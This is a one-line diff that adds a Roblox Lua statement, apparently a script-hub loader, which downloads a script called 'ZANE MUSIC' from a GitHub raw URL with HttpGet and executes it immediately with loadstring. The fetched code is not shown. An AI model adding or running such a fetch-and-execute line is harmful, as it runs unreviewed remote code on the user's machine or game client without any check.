@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/znaeeiek-max/Zane-music-hub/refs/heads/main/ZANE%20MUSIC"))()
